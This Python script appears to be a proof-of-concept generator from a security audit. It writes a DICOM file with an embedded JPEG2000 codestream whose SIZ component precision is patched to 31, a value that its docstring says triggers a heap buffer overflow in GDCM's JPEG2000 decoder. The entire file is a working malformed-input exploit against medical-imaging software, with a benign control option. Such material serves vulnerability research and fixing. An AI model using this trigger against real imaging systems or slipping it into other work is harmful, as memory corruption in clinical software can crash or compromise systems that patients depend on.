#!/usr/bin/env python3
"""
Finding 4 PoC generator - JPEG2000 SIZ precision overrides BitsAllocated
allocation (gdcmJPEG2000Codec.cxx, JPEG2000Codec::DecodeByStreamsCommon()).

DecodeByStreamsCommon sizes its output buffer from the DICOM header's
BitsAllocated (here 8, giving `raw = new char[64*64*1*1]`, 4096 bytes). The
J2K codestream's own SIZ marker declares the component precision
independently of the DICOM header; when comp->prec > 16, the decoder writes
a uint32_t per pixel into that 1-byte-per-pixel buffer, overflowing it by
3x (12288 bytes past the 4096-byte allocation). See harnesses/finding04.cpp.

The codestream itself is not synthesized here -- it is embedded verbatim
(as base64) below, extracted once from the reviewed trigger fixture, so
this generator's output is reproducible without depending on a host
OpenJPEG install (the original generator shelled out to `opj_compress`,
which produced different bytes on different machines). What this generator
controls deterministically is the SIZ component precision byte (Ssiz),
which is patched in place: --precision N sets Ssiz = N-1 at
codestream offset siz_offset+40.

  Ssiz=0x1E (30) -> precision=31 : the trigger (default)
  Ssiz=0x07 (7)  -> precision=8  : the benign control

Dataset: Explicit VR Little Endian meta, TransferSyntaxUID
1.2.840.10008.1.2.4.91 (JPEG 2000 Image Compression), Rows=Columns=64,
SamplesPerPixel=1,
MONOCHROME2, BitsAllocated=BitsStored=8, HighBit=7, PixelRepresentation=0.
PixelData (7FE0,0010) is OB with an empty Basic Offset Table item, one
fragment item holding the codestream, and a sequence delimiter item; the
element's length is the exact byte count of that item stream (not
0xFFFFFFFF), matching the reviewed fixture's encoding.
"""

import argparse
import base64
import os
import struct

# ---------------------------------------------------------------------------
# The 214-byte J2K codestream from fixtures/finding-04/trigger.dcm (file
# offset 434..648), embedded verbatim so this generator needs no external
# encoder. Its SIZ marker (0xFF51) starts at codestream offset 2; the Ssiz
# (component precision) byte patched by --precision sits at offset 2+40=42.
J2K_CODESTREAM_B64 = (
    "/0//UQApAAAAAABAAAAAQAAAAAAAAAAAAAAAQAAAAEAAAAAAAAAAAAABHgEB/1IADAAAAAEABQQE"
    "AAH/XAATQEBISFBISFBISFBISFBISFD/ZAAlAAFDcmVhdGVkIGJ5IE9wZW5KUEVHIHZlcnNpb24g"
    "Mi41LjT/kAAKAAAAAABdAAH/k9+AMAeDWaRVj8HzhIPnBg0B/38LPYfA+QJA+QIAIhoIXwN/3V/A"
    "fCJAfCIANqGavz2mNC/AOiQDogBfp8eHnawpP8ASQBIAi2IBv+GNYqf/2Q=="
)

SIZ_OFFSET = 2            # offset of the 0xFF51 SIZ marker within the codestream
PRECISION_BYTE_OFFSET = SIZ_OFFSET + 40   # Ssiz byte for the (single) component


def u16le(v):
    return struct.pack('<H', v & 0xFFFF)


def tag_bytes(group, elem):
    return struct.pack('<HH', group, elem)


def explicit_vr_de(group, elem, vr, data):
    assert isinstance(data, (bytes, bytearray))
    if len(data) % 2 != 0:
        if vr in ('CS', 'LO', 'LT', 'SH', 'ST', 'UT', 'UC'):
            data = data + b' '
        else:
            data = data + b'\x00'
    tg = tag_bytes(group, elem)
    vr_bytes = vr.encode('ascii')
    long_vr = vr in ('OB', 'OW', 'OF', 'SQ', 'UC', 'UN', 'UR', 'UT')
    if long_vr:
        return tg + vr_bytes + b'\x00\x00' + struct.pack('<I', len(data)) + data
    return tg + vr_bytes + struct.pack('<H', len(data)) + data


def ui_str(uid):
    b = uid.encode('ascii')
    if len(b) % 2 != 0:
        b += b'\x00'
    return b


def cs_str(s):
    b = s.encode('ascii')
    if len(b) % 2 != 0:
        b += b' '
    return b


def us_value(*values):
    return struct.pack('<' + 'H' * len(values), *values)


TRANSFER_SYNTAX_EXPLICIT_VR_LE = '1.2.840.10008.1.2.1'
TRANSFER_SYNTAX_JPEG2000 = '1.2.840.10008.1.2.4.91'
SOP_CLASS_SECONDARY_CAPTURE = '1.2.840.10008.5.1.4.1.1.7'
SOP_INSTANCE_UID = '1.2.3.4.5.6.7.8.9.0.1'


def patch_precision(codestream, precision):
    """Set the SIZ component precision by rewriting the Ssiz byte in place."""
    if not (1 <= precision <= 38):
        raise ValueError("JPEG2000 component precision must be in [1, 38]")
    patched = bytearray(codestream)
    patched[PRECISION_BYTE_OFFSET] = (precision - 1) & 0xFF
    return bytes(patched)


def build_encapsulated_pixel_data(codestream):
    """Basic Offset Table (empty) + one fragment item + sequence delimiter."""
    bot_item = struct.pack('<HHI', 0xFFFE, 0xE000, 0)
    fragment_item = struct.pack('<HHI', 0xFFFE, 0xE000, len(codestream)) + codestream
    seq_delimiter = struct.pack('<HHI', 0xFFFE, 0xE0DD, 0)
    return bot_item + fragment_item + seq_delimiter


def build_dicom(output_path, precision=31):
    rows = cols = 64
    codestream = patch_precision(base64.b64decode(J2K_CODESTREAM_B64), precision)
    pixel_data_value = build_encapsulated_pixel_data(codestream)

    # -----------------------------------------------------------------------
    # Dataset (Explicit VR Little Endian, tags in ascending order)
    # -----------------------------------------------------------------------
    ds = bytearray()
    ds += explicit_vr_de(0x0008, 0x0016, 'UI', ui_str(SOP_CLASS_SECONDARY_CAPTURE))
    ds += explicit_vr_de(0x0008, 0x0018, 'UI', ui_str(SOP_INSTANCE_UID))
    ds += explicit_vr_de(0x0028, 0x0002, 'US', us_value(1))                 # SamplesPerPixel
    ds += explicit_vr_de(0x0028, 0x0004, 'CS', cs_str('MONOCHROME2'))       # PhotometricInterpretation
    ds += explicit_vr_de(0x0028, 0x0010, 'US', us_value(rows))              # Rows
    ds += explicit_vr_de(0x0028, 0x0011, 'US', us_value(cols))              # Columns
    ds += explicit_vr_de(0x0028, 0x0100, 'US', us_value(8))                 # BitsAllocated
    ds += explicit_vr_de(0x0028, 0x0101, 'US', us_value(8))                 # BitsStored
    ds += explicit_vr_de(0x0028, 0x0102, 'US', us_value(7))                 # HighBit
    ds += explicit_vr_de(0x0028, 0x0103, 'US', us_value(0))                 # PixelRepresentation
    ds += explicit_vr_de(0x7FE0, 0x0010, 'OB', bytes(pixel_data_value))     # PixelData (encapsulated)

    # -----------------------------------------------------------------------
    # File Meta Information (group 0002), always Explicit VR Little Endian
    # -----------------------------------------------------------------------
    meta_elements = bytearray()
    meta_elements += explicit_vr_de(0x0002, 0x0001, 'OB', b'\x00\x01')
    meta_elements += explicit_vr_de(0x0002, 0x0002, 'UI', ui_str(SOP_CLASS_SECONDARY_CAPTURE))
    meta_elements += explicit_vr_de(0x0002, 0x0003, 'UI', ui_str(SOP_INSTANCE_UID))
    meta_elements += explicit_vr_de(0x0002, 0x0010, 'UI', ui_str(TRANSFER_SYNTAX_JPEG2000))

    meta = explicit_vr_de(0x0002, 0x0000, 'UL', struct.pack('<I', len(meta_elements))) + meta_elements

    preamble = b'\x00' * 128 + b'DICM'
    output = preamble + bytes(meta) + bytes(ds)

    os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)
    with open(output_path, 'wb') as f:
        f.write(output)

    return output


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('output', nargs='?',
                         default=os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                               '..', 'fixtures', 'finding-04', 'trigger.dcm'))
    parser.add_argument('--precision', type=int, default=31,
                         help="JPEG2000 SIZ component precision (Ssiz = precision - 1); "
                              "default 31 reproduces the trigger, 8 reproduces the control")
    args = parser.parse_args()

    output = build_dicom(args.output, precision=args.precision)
    ssiz = (args.precision - 1) & 0xFF
    print(f"[+] {args.output}: {len(output)} bytes, precision={args.precision} "
          f"(Ssiz=0x{ssiz:02x}) at codestream offset {PRECISION_BYTE_OFFSET}")


if __name__ == '__main__':
    main()
